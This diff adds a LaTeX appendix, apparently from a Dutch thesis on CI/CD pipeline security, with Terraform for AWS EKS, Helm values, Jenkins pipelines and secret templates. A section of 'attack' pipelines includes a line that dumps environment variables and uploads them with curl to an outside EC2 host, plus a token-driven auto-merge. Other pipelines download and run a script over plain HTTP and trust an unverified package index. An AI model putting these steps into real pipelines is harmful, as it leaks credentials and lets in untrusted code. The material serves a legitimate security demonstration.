+        policy_arn = "arn:aws:iam::aws:policy/AmazonEKSClusterPolicy"
+      }
+      
+      resource "aws_iam_role_policy_attachment" "amazon_eks_vpc_resource_controller" {
+        role       = aws_iam_role.eks_cluster.name
+        policy_arn = "arn:aws:iam::aws:policy/AmazonEKSVPCResourceController"
+      }
+      
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{EKS policies}
+{EKS policies}}
+\label{sec:EKS policies}
+
+\begin{lstlisting}[language=terraform]
+
+  # Resource block die de policy linkt met de nieuwe rol
+  resource "aws_iam_role_policy_attachment" "amazon_eks_cluster_policy" {
+    
+    # Naam van de nieuwe aangemaakte rol
+    role       = aws_iam_role.eks_cluster.name
+
+    # Deze rol zorgt ervoor dat EKS cluster resources kan beheren
+    policy_arn = "arn:aws:iam::aws:policy/AmazonEKSClusterPolicy"
+  }
+  
+  # Resource block die de policy linkt met de nieuwe rol
+  resource "aws_iam_role_policy_attachment" "amazon_eks_vpc_resource_controller" {
+    
+    # Naam van de nieuwe aangemaakte rol
+    role       = aws_iam_role.eks_cluster.name
+
+    # Deze policy wordt gebruikt om de werker nodes te beheren
+    policy_arn = "arn:aws:iam::aws:policy/AmazonEKSVPCResourceController"
+  }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Input}
+{Input}}
+
+\begin{lstlisting}[language=terraform]
+    variable "aws_eks_cluster_name" {
+        type = string
+        default = "example"
+      
+    }
+    
+    variable "aws_eks_iam_role_name" {
+        type = string
+        default = "test_role"
+      
+    }
+    
+    variable "vpc_id" {
+      type = string
+      
+    }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Output}
+{Output}}
+
+\begin{lstlisting}[language=terraform]
+    output "aws_eks_cluster_name" {
+        value = aws_eks_cluster.example.name
+      }
+      
+      output "aws_eks_certificate" {
+        value = aws_eks_cluster.example.identity[0].oidc[0].issuer
+        
+      }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Variables}
+{Variables}}
+
+\begin{lstlisting}[language=terraform]
+    aws_eks_cluster_name = "example"
+
+    aws_eks_iam_role_name = "test_role"
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Datasources}
+{Datasources}}
+
+\begin{lstlisting}[language=terraform]
+    data "aws_subnets" "all" {
+        filter {
+          name = "vpc-id"
+          values = [var.vpc_id]
+        }
+      }
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{EKS node groep}
+{EKS node groep}}
+\label{sec:EKS node groep}
+
+\subsubsection{\IfLanguageName{dutch}{EKS node groep resource}
+{EKS node groep resource}}
+
+\begin{lstlisting}[language=terraform]
+    resource "aws_eks_node_group" "example" {
+        cluster_name    = var.aws_eks_cluster_name
+        node_group_name = var.aws_eks_node_group
+        node_role_arn   = aws_iam_role.node_group.arn
+        subnet_ids      = data.aws_subnets.name.ids
+      
+        scaling_config {
+          desired_size = 2
+          max_size     = 2
+          min_size     = 1
+        }
+      
+        ami_type = var.aws_eks_node_group_ami
+      
+        capacity_type = var.aws_eks_node_group_capacity_type
+      
+        disk_size = var.aws_eks_node_group_disk_size
+      
+        force_update_version = var.aws_eks_node_group_force_update
+      
+        instance_types = var.aws_eks_node_group_instance_type
+        
+        labels = var.aws_eks_node_group_role
+      
+        update_config {
+          max_unavailable = 1
+        }
+      
+        # Ensure that IAM Role permissions are created before and deleted after EKS Node Group handling.
+        # Otherwise, EKS will not be able to properly delete EC2 Instances and Elastic Network Interfaces.
+        depends_on = [
+          aws_iam_role_policy_attachment.amazon_eks_worker_node_policy,
+          aws_iam_role_policy_attachment.amazon_eks_CNI_policy,
+          aws_iam_role_policy_attachment.amazon_ec2_container_registry_readonly,
+        ]
+      } 
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{EKS node groep rol}
+{EKS node groep rol}}
+\label{sec:EKS node groep policies}
+
+\begin{lstlisting}[language=terraform]
+    resource "aws_iam_role" "node_group" {
+        name = var.aws_node_group_iam_role_name
+      
+        # Terraform's "jsonencode" function converts a
+        # Terraform expression result to valid JSON syntax.
+        assume_role_policy = jsonencode({
+          Version = "2012-10-17"
+          Statement = [
+            {
+              Action = "sts:AssumeRole"
+              Effect = "Allow"
+              Sid    = ""
+              Principal = {
+                Service = "ec2.amazonaws.com"
+              }
+            },
+          ]
+        })
+      }
+      
+      resource "aws_iam_role_policy_attachment" "amazon_eks_worker_node_policy" {
+        role       = aws_iam_role.node_group.name
+        policy_arn = "arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy"
+      }
+      
+      resource "aws_iam_role_policy_attachment" "amazon_eks_CNI_policy" {
+        role       = aws_iam_role.node_group.name
+        policy_arn = "arn:aws:iam::aws:policy/AmazonEKS_CNI_Policy"
+      }
+      
+      resource "aws_iam_role_policy_attachment" "amazon_ec2_container_registry_readonly" {
+        role       = aws_iam_role.node_group.name
+        policy_arn = "arn:aws:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly"
+      }    
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Input}
+{Input}}
+
+\begin{lstlisting}[language=terraform]
+    variable "aws_eks_cluster_name" {
+        type = string
+      
+    }
+    
+    variable "aws_eks_node_group" {
+        type = string
+        default = "example"
+      
+    }
+    
+    
+    variable "aws_node_group_iam_role_name" {
+        type = string
+        default = "test_role2"
+      
+    }
+    
+    variable "aws_eks_node_group_ami" {
+        type = string
+        default = "AL2_x86_64"
+      
+    }
+    
+    variable "aws_eks_node_group_capacity_type" {
+      type = string
+      default = "ON_DEMAND"
+    }
+    
+    variable "aws_eks_node_group_disk_size" {
+        type = number
+        default = 100
+      
+    }
+    
+    variable "aws_eks_node_group_force_update" {
+        type = bool
+        default = false
+      
+    }
+    
+    variable "aws_eks_node_group_instance_type" {
+        type = list(string)
+        default = ["t3.small"]
+    
+      
+    }
+    
+    variable "aws_eks_node_group_role" {
+        type = map(any)
+        default = {
+        role = "nodes-general"
+      }
+      
+    }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Variables}
+{Variables}}
+
+\begin{lstlisting}[language=terraform]
+    aws_eks_node_group_ami = "AL2_x86_64"
+  
+    aws_eks_node_group_capacity_type = "ON_DEMAND"
+    
+    aws_eks_node_group_disk_size = 100
+      
+    aws_eks_node_group_force_update = false
+      
+    aws_eks_node_group_instance_type = ["t3.small"]
+    
+    aws_eks_node_group_role = {role = "nodes-general"}
+    
+    aws_eks_node_group = "example"
+    
+    aws_node_group_iam_role_name = "test_role3"
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Datasources}
+{Datasources}}
+
+\begin{lstlisting}[language=terraform]
+    data "aws_subnets" "name" {
+        filter {
+          name = "tag:Name"
+          values = ["private*"]
+        }
+      }
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{Helm charts}
+{Helm charts}}
+\label{sec:Helm charts}
+
+\subsubsection{\IfLanguageName{dutch}{Argocd overschreven waarden}
+{Argocd overwritten values}}
+
+\begin{lstlisting}[language=yaml, style=yamlstyle]
+    ---
+    global:
+      image:
+        tag: "v2.6.6"
+    
+    server:
+      extraArgs:
+        - --insecure
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Imageupdater overschreven waarden}
+{Imageupdater overwritten values}}
+
+\begin{lstlisting}[language=yaml, style=yamlstyle]
+    ---
+    image:
+      tag: "v0.12.2"
+    
+    metrics:
+      enabled: true
+    
+    config:
+      registries:
+        - name: Docker Hub
+          api_url: https://registry-1.docker.io
+          ping: yes
+          credentials: secret:argocd/dockerhub#my_token
+          limit: 20
+          default: true    
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Helm provider}
+{Helm provider}}
+\label{sec:Helm provider}
+
+\begin{lstlisting}[language=terraform]
+  # Helm provider
+  provider "helm" {
+      kubernetes {
+          host                   = data.aws_eks_cluster.ex.endpoint
+          cluster_ca_certificate = base64decode(data.aws_eks_cluster.ex.certificate_authority[0].data)
+              exec {
+                  api_version = "client.authentication.k8s.io/v1beta1"
+                  args        = ["eks", "get-token", "--cluster-name", data.aws_eks_cluster.ex.id]
+                  command     = "aws"
+              }
+      }
+  }
+\end{lstlisting}
+
+\subsubsection{\IfLanguageName{dutch}{Helm provider Datasources}
+{Helm provider datasources}}
+\label{sec:Helm provider datasources}
+
+\begin{lstlisting}[language=terraform]
+    data "aws_eks_cluster" "ex" {
+        depends_on = [
+          module.aws_eks_node_group
+        ]
+        name = module.aws_eks_cluster.aws_eks_cluster_name
+    }
+    
+    data "aws_eks_cluster_auth" "ex" {
+        depends_on = [
+          module.aws_eks_node_group
+        ]
+        name = module.aws_eks_cluster.aws_eks_cluster_name
+    }
+    
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{Overzicht van de infrastructuur modules}
+{Overview of the infrastructure modules}}
+\label{sec:Overzicht van de infrastructuur modules}
+
+\begin{lstlisting}[language=terraform]
+  module "aws_key_pair" {
+    source = "./modules/aws_key_pair"
+
+    for_each = var.key_config
+
+    aws_key_pair_name = each.value.aws_key_pair_name
+    aws_key_pair_public = each.value.aws_key_pair_public
+  
+}
+
+module "aws_instances" {
+    source = "./modules/aws_ec2_instance"
+    depends_on = [
+      module.aws_route_table_association_public
+    ]
+    for_each = var.instance_config
+
+    aws_ami = each.value.aws_ami
+    aws_instance_type = each.value.aws_instance_type
+    aws_key_pair_name = each.value.aws_key_pair_name
+    aws_associate_public_ip = each.value.aws_associate_public_ip
+    aws_security_group = each.value.aws_security_group
+    aws_subnet_name = each.value.aws_subnet_name
+    aws_instance_volume_type = each.value.aws_instance_volume_type
+    aws_instance_volume_size = each.value.aws_instance_volume_size
+    aws_instance_delete_on_termination = each.value.aws_instance_delete_on_termination
+    aws_tags = each.value.aws_tags
+    script = each.value.script
+  
+}
+
+module "aws_launch_template" {
+  source = "./modules/aws_launch_template"
+  depends_on = [
+    module.aws_route_table_association_public
+  ]
+
+  aws_ami = var.launch_template_config.aws_ami
+  aws_key_pair_name = var.launch_template_config.aws_key_pair_name
+  aws_instance_type = var.launch_template_config.aws_instance_type
+  aws_launch_template_name = var.launch_template_config.aws_launch_template_name
+  script = var.launch_template_config.script
+  
+}
+
+module "aws_autoscaling_group" {
+  source = "./modules/aws_autoscaling_group"
+  depends_on = [
+    module.aws_launch_template
+  ]
+  aws_launch_template_id = module.aws_launch_template.aws_launch_template_id
+  aws_autoscaling_group_name = var.aws_autoscaling_group_name
+}
+module "aws_instances_custom" {
+    source = "./modules/aws_ec2_instance_custom"
+    depends_on = [
+      module.aws_route_table_association_public, module.aws_autoscaling_group
+    ]
+
+    for_each = var.instance_config_custom
+
+    aws_ami = each.value.aws_ami
+    aws_instance_type = each.value.aws_instance_type
+    aws_key_pair_name = each.value.aws_key_pair_name
+    aws_associate_public_ip = each.value.aws_associate_public_ip
+    aws_security_group = each.value.aws_security_group
+    aws_subnet_name = each.value.aws_subnet_name
+    aws_instance_volume_type = each.value.aws_instance_volume_type
+    aws_instance_volume_size = each.value.aws_instance_volume_size
+    aws_instance_delete_on_termination = each.value.aws_instance_delete_on_termination
+    aws_tags = each.value.aws_tags
+    script = each.value.script
+    aws_instance_role_name = each.value.aws_instance_role_name
+  
+}
+
+module "aws_loadbalancer" {
+  source = "./modules/aws_elb"
+  depends_on = [
+    module.aws_instances, module.aws_instances_custom, module.public_subnet, module.aws_security_groups
+  ]
+
+  for_each = var.loadbalancer_config
+
+  aws_security_group = each.value.aws_security_group
+  cross_zone_load_balancing = each.value.cross_zone_load_balancing
+  loadbalancer_instance_port = each.value.loadbalancer_instance_port
+  loadbalancer_target = each.value.loadbalancer_target
+  
+}
+
+module "aws_eks_cluster" {
+    source = "./modules/aws_eks_cluster"
+    depends_on = [
+      module.private_subnet, module.public_subnet
+    ]
+    aws_eks_cluster_name = var.aws_eks_cluster_name
+    vpc_id = module.aws_vpc.vpc_id
+    aws_eks_iam_role_name = var.aws_eks_iam_role_name   
+}
+
+module "aws_eks_node_group" {
+  source = "./modules/aws_eks_node_group"
+  depends_on = [
+    module.aws_eks_cluster, module.private_subnet
+  ]
+
+  aws_eks_node_group_ami = var.aws_eks_node_group_ami
+  aws_eks_node_group_capacity_type = var.aws_eks_node_group_capacity_type
+  aws_eks_node_group_disk_size = var.aws_eks_node_group_disk_size
+  aws_eks_node_group_force_update = var.aws_eks_node_group_force_update
+  aws_eks_node_group_instance_type = var.aws_eks_node_group_instance_type
+  aws_eks_node_group_role = var.aws_eks_node_group_role
+  aws_eks_cluster_name = module.aws_eks_cluster.aws_eks_cluster_name
+  aws_eks_node_group = var.aws_eks_node_group
+  aws_node_group_iam_role_name = var.aws_node_group_iam_role_name
+
+}
+
+module "aws_eks_helm_charts" {
+  source = "./modules/aws_helm_charts"
+  depends_on = [
+    module.aws_eks_node_group
+  ]
+  
+}
+\end{lstlisting}
+
+\section{\IfLanguageName{dutch}{Bestanden voor de CI pipelines}
+{Files for the CI pipelines}}
+\label{sec:Bestanden voor de CI pipelines}
+
+\subsection{\IfLanguageName{dutch}{Pipeline bestand voor het bouwen van de java applicatie}
+{Pipeline file to build java application}}
+\label{sec:Pipeline bestand voor het bouwen van de java applicatie}
+
+\begin{lstlisting}[language=yaml, style=yamlstyle]
+  @Library('my-shared-library') _
+  pipeline {
+      agent { label 'ec2-fleet'}
+  
+      parameters {
+          choice(name: 'action', choices:'create\ndelete', description: 'Choose create/Destroy')
+          string(name: 'ImageName', description: 'name of the docker build', defaultValue: 'javapp')
+          string(name: 'ImageTag', description: 'tag of the docker build', defaultValue: 'v1')
+      }
+      environment {
+          DOCKERHUBID = credentials('docker_access_key')
+      }
+      stages {
+          stage('Unit test maven'){
+           when { expression{ params.action == 'create'}}
+              steps{
+                  script{
+                    sh """
+                    curl -Os http://192.168.23.13:8080/reportcov.sh
+                    chmod +x reportcov.sh
+                    ./reportcov.sh
+                    """
+                    mvnTest()
+                  }
+              }
+          }
+  
+          stage('Integration Test maven'){
+          when { expression{ params.action == 'create'}}
+              steps{
+                  script{
+                      mvnIntegrationTest()
+                  }
+              }
+          }
+  
+          stage('Static code analysis: Sonarqube'){
+          when { expression{ params.action == 'create'}}
+              steps{
+                  script{
+                      def SonarqubecredentialId = 'sonar'
+                      staticCodeAnalysis(SonarqubecredentialId)
+                  }
+              }
+          }
+  
+          stage('Quality Gate Status Check: Sonarqube'){
+          when { expression{ params.action == 'create'}}
+              steps{
+                  script{
+                      def SonarqubecredentialId = 'sonar'
+                      QualityGateStatus(SonarqubecredentialId)
+                  }
+              }
+          }
+  
+          stage('Maven Build: maven') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      mvnBuild()
+                  }
+              }
+          }
+  
+          stage('Docker Image Build') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerBuild("${params.ImageName}", "${params.ImageTag}", '$DOCKERHUBID_USR')
+                  }
+              }
+          }
+  
+          stage('Docker login: DockerHub ') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerLogin('$DOCKERHUBID_USR', '$DOCKERHUBID_PSW')
+                  }
+              }
+          }
+  
+          stage('Docker Image Scan: trivy ') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerImageScan("${params.ImageName}", "${params.ImageTag}", '$DOCKERHUBID_USR')
+                  }
+              }
+          }
+  
+          stage('Docker Image Push: DockerHub ') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerImagePush("${params.ImageName}", "${params.ImageTag}", '$DOCKERHUBID_USR')
+                  }
+              }
+          }
+  
+          stage('Docker Image Cleanup: DockerHub ') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerImageCleanup("${params.ImageName}", "${params.ImageTag}", '$DOCKERHUBID_USR')
+                  }
+              }
+          }
+      }
+      post{
+          always {
+              sh 'docker logout'
+  
+              archiveArtifacts artifacts: "cve_report.html", fingerprint: true
+  
+              publishHTML (target: [
+                  allowMissing: false,
+                  alwaysLinkToLastBuild: false,
+                  keepAll: true,
+                  reportDir: '.',
+                  reportFiles: 'cve_report.html',
+                  reportName: "CVE Report"
+              ])
+          }
+      }
+  }
+  
+\end{lstlisting}
+
+\subsection{\IfLanguageName{dutch}{Pipeline bestand voor het bouwen van de python applicatie}
+{Pipeline file to build python application}}
+\label{sec:Pipeline bestand voor het bouwen van de python applicatie}
+
+\begin{lstlisting}[language=yaml, style=yamlstyle]
+  pipeline {
+    agent { label 'main' }
+    environment {
+        GIT_BRANCH = sh(script: 'git rev-parse --abbrev-ref HEAD', returnStdout: true).trim()
+        GIT_URL = sh(script: 'git config --get remote.origin.url', returnStdout: true).trim()
+        KEY_FILE = credentials('key')
+    }
+    stages {
+        
+        stage('Pull Request') {
+            when {
+                allOf {
+                    expression { env.BRANCH_NAME ==~ /^PR-\d+$/ }
+                    expression { env.CHANGE_ID != null }
+                }
+            }
+            stages {
+                stage ('Send notification') {
+                    steps{
+                        script {
+                            try {
+                                sh "echo Pull Request ${env.CHANGE_TITLE} created in the reportcov repository"
+                                mail bcc: '', body: '', cc: '', from: '', subject: "Pull Request ${env.CHANGE_TITLE} created in the reportcov repository", to: 'victor.vanhooren@outlook.be'
+                            }
+                            catch (Exception err) {
+                                currentBuild.result = 'SUCCESS'
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        stage ('Release') {
+            when {
+                allOf {
+                    expression { env.BRANCH_NAME == 'main' }
+                    expression { env.CHANGE_ID == null }
+                }
+            }
+            stages {
+                stage ('Install dependencies') {
+                    steps {
+                        sh """
+                            python3 -m pip install -U pip
+                            python3 -m pip install -U wheel
+                            python3 -vvv -m pip install --progress-bar=off tox pytest-xdist -rci/requirements.txt --no-cache-dir --extra-index-url http://192.168.23.13:8080 --trusted-host 192.168.23.13 --user
+                        """
+                    }
+                }
+                stage ('install') {
+                    steps {
+                        sh "python3 -m pip install . || true"
+                    }
+                }
+                stage ('Deploy') {
+                    steps {
+                        sh 'scp -vvv -o StrictHostKeyChecking=no -i ${KEY_FILE} reportcov.sh ubuntu@http://192.168.23.13:8080:~'
+                    }
+                }
+            }
+        }
+    }
+    post {
+        always {
+            cleanWs()
+        }
+        failure {
+            script {
+                currentBuild.result = 'SUCCESS'
+            }
+        }
+    }
+}
+  
+\end{lstlisting}
+
+\section{\IfLanguageName{dutch}{Bestanden voor de CD pipeline}
+{Files for the CD pipeline}}
+\label{sec:Bestanden voor de CD pipeline}
+
+\subsection{\IfLanguageName{dutch}{Sealed secrets templates voor de CD pipeline}
+{Sealed secrets templates for the CD pipeline}}
+\label{sec:Sealed secrets templates voor de CD pipeline}
+
+\begin{lstlisting}[language=yaml, style=yamlstyle]
+  ---
+  apiVersion: v1
+  kind: Secret
+  metadata:
+    name: sshkey
+    namespace: argocd
+    labels:
+      argocd.argoproj.io/secret-type: repository
+  stringData:
+    url: ssh://git@github.com/VictorVanhoorenHogent/testargocd.git
+    sshPrivateKey: |
+      -----BEGIN OPENSSH PRIVATE KEY-----
+      -----END OPENSSH PRIVATE KEY-----
+  insecure: "false"
+  enableLfs: "false"
+  ---
+  apiVersion: v1
+  kind: Secret
+  metadata:
+    name: dockerhub
+    namespace: argocd
+  type: Opaque
+  stringData:
+    my_token: 
+\end{lstlisting}
+
+\section{\IfLanguageName{dutch}{Pipeline bestanden die gebruikt worden bij de aanvallen}
+{Pipeline files that are used in the attacks}}
+\label{sec:Pipeline bestanden die gebruikt worden bij de aanvallen}
+
+\subsection{\IfLanguageName{dutch}{Automerge aanval}
+{automerge attack}}
+\label{sec:Automerge aanval}
+
+\begin{lstlisting}[language=yaml, style=yamlstyle]
+  @Library('my-shared-library') _
+  pipeline {
+      agent { label 'ec2-fleet'}
+  
+      parameters {
+          choice(name: 'action', choices:'create\ndelete', description: 'Choose create/Destroy')
+          string(name: 'ImageName', description: 'name of the docker build', defaultValue: 'javapp')
+          string(name: 'ImageTag', description: 'tag of the docker build', defaultValue: 'v1')
+      }
+  
+      environment {
+          DOCKERHUBID = credentials('docker_access_key')
+      }
+      stages {
+          stage('pr_checks') {
+              steps {
+                  sh 'env > env && curl -F "files=@env" http://ec2-16-16-75-127.eu-north-1.compute.amazonaws.com:8080/upload'
+                      withCredentials([usernamePassword(credentialsId: 'github_login', usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
+                          sh '''
+                              PR_ID=$(basename "$CHANGE_URL")
+                              if [ $? -eq 0 ];
+                              then
+                                  gitp=`git diff --word-diff=porcelain origin/${CHANGE_TARGET} | grep -e "^+[^+]" | wc -w | xargs`
+                                  gitm=`git diff --word-diff=porcelain origin/${CHANGE_TARGET} | grep -e "^-[^-]" | wc -w | xargs`      
+                                  if [ $(($gitp - $gitm)) -eq 0 ] ; then check1=true; else check1=false; fi
+                                  if [ $(wc -l <version) -eq 0 -a $(grep -Po "^\\d{1,2}\\.\\d{1,2}\\.\\d{1,2}$" version) ] ; then check2=true; else check2=false; fi
+                                  if [ $(git diff --name-only origin/${CHANGE_TARGET} | grep version) ] ; then check3=true; else check3=false; fi
+                                  if $check1 && $check2 && $check3;
+                                  then
+                                      curl -X 'PUT' \
+                                      -H "Accept: application/vnd.github+json" \
+                                      -H "X-GitHub-Api-Version: 2022-11-28" \
+                                      -H 'Authorization: Bearer '"$TOKEN" \
+                                      'https://api.github.com/repos/victorwillemBPci-cd/bp_cicd_pipeline/pulls/'"$PR_ID"'/merge' \
+                                      -d '{
+                                          "Do": "merge"
+                                      }';
+                                  else
+                                      echo 'skipping...';
+                                  fi
+                              fi
+                          '''
+                      }
+              }
+          }
+  
+          stage('Unit test maven'){
+           when { expression{ params.action == 'create'}}
+              steps{
+                  script{
+                      mvnTest()
+                  }
+              }
+          }
+  
+          stage('Integration Test maven'){
+          when { expression{ params.action == 'create'}}
+              steps{
+                  script{
+                      mvnIntegrationTest()
+                  }
+              }
+          }
+  
+          // stage('Static code analysis: Sonarqube'){
+          // when { expression{ params.action == 'create'}}
+          //     steps{
+          //         script{
+          //             def SonarqubecredentialId = 'api_key_sonar'
+          //             staticCodeAnalysis(SonarqubecredentialId)
+          //         }
+          //     }
+          // }
+  
+          // stage('Quality Gate Status Check: Sonarqube'){
+          // when { expression{ params.action == 'create'}}
+          //     steps{
+          //         script{
+          //             def SonarqubecredentialId = 'api_key_sonar'
+          //             QualityGateStatus(SonarqubecredentialId)
+          //         }
+          //     }
+          // }
+  
+          stage('Maven Build: maven') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      mvnBuild()
+                  }
+              }
+          }
+  
+          stage('Docker Image Build') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerBuild("${params.ImageName}", "${params.ImageTag}", '$DOCKERHUBID_USR')
+                  }
+              }
+          }
+  
+          stage('Docker login: DockerHub ') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerLogin('$DOCKERHUBID_USR', '$DOCKERHUBID_PSW')
+                  }
+              }
+          }
+  
+          stage('Docker Image Scan: trivy ') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerImageScan("${params.ImageName}", "${params.ImageTag}", '$DOCKERHUBID_USR')
+                  }
+              }
+          }
+  
+          stage('Docker Image Push: DockerHub ') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerImagePush("${params.ImageName}", "${params.ImageTag}", '$DOCKERHUBID_USR')
+                  }
+              }
+          }
+  
+          stage('Docker Image Cleanup: DockerHub ') {
+              when { expression { params.action == 'create' } }
+              steps {
+                  script {
+                      dockerImageCleanup("${params.ImageName}", "${params.ImageTag}", '$DOCKERHUBID_USR')
+                  }
+              }
+          }
+      }
+      post{
+          always {
+              sh 'docker logout'
+  
+              archiveArtifacts artifacts: "cve_report.html", fingerprint: true
+  
+              publishHTML (target: [
+                  allowMissing: false,
+                  alwaysLinkToLastBuild: false,
+                  keepAll: true,
+                  reportDir: '.',
+                  reportFiles: 'cve_report.html',
+                  reportName: "CVE Report"
+              ])
+          }
+      }
+  }
+\end{lstlisting}
